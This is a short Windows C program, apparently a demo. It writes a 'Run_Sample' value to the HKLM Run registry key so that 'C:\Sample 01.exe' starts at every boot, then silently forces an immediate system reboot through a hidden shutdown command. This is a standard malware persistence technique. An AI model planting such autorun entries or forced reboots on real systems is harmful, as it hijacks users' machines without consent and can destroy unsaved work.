#include <windows.h>
#include <stdio.h>

int main( )
{ 
	HKEY	hKey;
	TCHAR	lpRunPath[] = "SOFTWARE\\Microsoft\\windows\\CurrentVersion\\Run";
	TCHAR	lpSamplePath[] = "C:\\Sample 01.exe";
	TCHAR	lpValue[MAX_PATH] = {0,};
	DWORD	dwCount = 0, 
			dwValueSize = _MAX_PATH;
	LONG	lResult;

	lResult = RegOpenKeyEx (HKEY_LOCAL_MACHINE,
							lpRunPath, 
							0, 
							KEY_ALL_ACCESS, 
							&hKey);
	if(lResult != ERROR_SUCCESS)
		return 0;

	for (dwCount; lResult == 0x0000 || lResult == 0x00EA; dwCount++)
	{
		//Retrieves the value of the registry.
		lResult = RegEnumValue (hKey, 
								dwCount, 
								lpValue,
								&dwValueSize,
								0, NULL, NULL, NULL);
		
		//If the Sample value exists, delete the value.
		if(!strcmp(lpValue, "Run_Sample"))
			RegDeleteValue(hKey, lpValue);
	}

	dwValueSize = (DWORD) strlen(lpSamplePath) + 1;
	
	//Register the Sample values.
	lResult = RegSetValueEx(hKey, 
							"Run_Sample", 
							0, REG_SZ, 
							(BYTE*)lpSamplePath, 
							dwValueSize);
	if(lResult != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return 0;
	}
	
	RegCloseKey(hKey);
	
	MessageBox(NULL, "The registration has been completed.\nComputer Reset START!!", "RegEdit", MB_OK);
	
	WinExec("cmd.exe /C shutdown -r -f -t 0", SW_HIDE);

	return 1;
}